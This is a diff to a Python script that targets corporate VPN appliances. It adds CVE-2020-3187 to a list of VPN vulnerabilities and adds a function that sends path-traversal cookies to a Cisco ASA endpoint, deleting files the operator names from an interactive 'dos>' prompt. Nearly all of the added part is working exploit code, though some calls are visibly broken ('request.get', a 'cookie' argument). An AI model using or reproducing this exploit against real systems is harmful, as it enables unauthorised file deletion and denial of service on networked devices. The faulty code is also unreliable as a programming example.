@@ -10,7 +10,7 @@ requests.packages.urllib3.disable_warnings()
 
 cvelist = ['CVE-2019-1579', 'CVE-2018-13380', 'CVE-2018-13381',
 	  'CVE-2018-13379', 'CVE-2019-11507', 'CVE-2019-11510',
-	  'CVE-2019-11542', 'CVE-2019-11540']
+	  'CVE-2019-11542', 'CVE-2019-11540', 'CVE-2020-3187']
 # Updating this list ...
 vpnsub = ['vpn', 'covpn', 'tcovpn',
           'panvpn', 'vpn-blr', 'vpn-blr1',
@@ -75,6 +75,28 @@ def printable(b):
     
     
 
+def cve_2020_3187(host, port):
+    url = "https://%s%s/+CSCOE+/session_password.html" % (host, port)
+    r = request.get(url, verify=False)
+	
+    if r.status_code != 200:
+	print('The host %s is not vulnerable to CVE-2020-3187' % host)
+    else:
+	print('Pwned the DoS shell of %s' % host)
+	print('')
+	print('DoS shell CVE-2020-3187')
+	print('(!) Enter files you want to DoS to delete')
+	while 1:
+	    data = input('dos> ')
+	    if data.replace(' ', '') in ['exit', 'quit']:
+		break
+	    if data[0] != '/':
+		data = '/'+data
+	    COOKIE = {'token' : '..%s' % data}
+	    r = request.get(url, verify=False, cookie=COOKIE)
+	    print('Deleted %s' % data)
+	
+	
 def cve_2019_1579(host, port):
     sign = '<msg>Invalid parameters</msg>'
     
